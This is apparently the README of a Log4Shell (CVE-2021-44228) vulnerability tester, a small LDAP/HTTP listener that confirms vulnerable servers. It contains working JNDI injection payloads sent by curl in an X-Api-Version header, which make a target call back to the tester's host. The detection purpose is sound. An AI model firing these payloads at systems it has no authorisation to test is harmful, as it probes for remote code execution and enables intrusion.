# One-and-only-port Log4Shell vulnerability tester 

This is a lightweight vulnerability tester for the Log4Shell vulnerability (CVE-2021-44228)

It is designed to run both **LDAP** and **HTTP** server on the **same port** for some ease of use in some organisations.

Please note that the code doesn't need any extra dependecies for ease of deployment. 

## Docker usage 

By default the docker image listen on 0.0.0.0:8080

```sh 
$ docker run --rm -ti -p 1234:8080 dcylabs/log4shell-vulnerability-tester

######################################################
#                                                    #
#           LOG4SHELL VULNERABILITY TESTER           #
#                                                    #
#   This program is used to test Log4Shell vuln.     #
#   it is designed to run both, LDAP and HTTP srv.   #
#   on the same port for some organization purpose   #
#                                                    #
#   Note: it is written in the objective to have     #
#       no extra dependencies than pythons ones      #
#                                                    #
#                                Ludovic DECAMPY     #
#                                                    #
######################################################

Server started ...
Usage: 
    curl <target> -H 'X-Api-Version: ${jndi:ldap://0.0.0.0:8080/<unique hash>} '
    
Vulnerability confirmed for: todocker-A-BBD56E
Vulnerability confirmed for: todocker-A-BBD56E
Vulnerability confirmed for: todocker-K-EF983A
Vulnerability confirmed for: todocker-K-EF983A
```

To attack some url with the dockerized checker 

```sh 
$ curl <vulnerable-app>:8080 -H 'X-Api-Version: ${jndi:ldap://192.168.12.155:1234/todocker-A-BBD56E}'
$ curl <vulnerable-app>:8080 -H 'X-Api-Version: ${jndi:ldap://192.168.12.155:1234/todocker-K-EF983A}'
```

## Python usage  

When using in native python you need to specify which ip and port you listen on

```sh 
$ python3 192.168.12.155 8888

######################################################
#                                                    #
#           LOG4SHELL VULNERABILITY TESTER           #
#                                                    #
#   This program is used to test Log4Shell vuln.     #
#   it is designed to run both, LDAP and HTTP srv.   #
#   on the same port for some organization purpose   #
#                                                    #
#   Note: it is written in the objective to have     #
#       no extra dependencies than pythons ones      #
#                                                    #
#                                Ludovic DECAMPY     #
#                                                    #
######################################################

Server started ...
Usage: 
    curl <target> -H 'X-Api-Version: ${jndi:ldap://192.168.12.155:8888/<unique hash>} '
    
Vulnerability confirmed for: site-A-BBD56E
Vulnerability confirmed for: site-A-BBD56E
Vulnerability confirmed for: site-K-EF983A
Vulnerability confirmed for: site-K-EF983A
```

To attack some url with the checker 

```sh 
$ curl <vulnerable-app>:8080 -H 'X-Api-Version: ${jndi:ldap://192.168.12.155:8888/site-A-BBD56E}'
$ curl <vulnerable-app>:8080 -H 'X-Api-Version: ${jndi:ldap://192.168.12.155:8888/site-K-EF983A}'
```
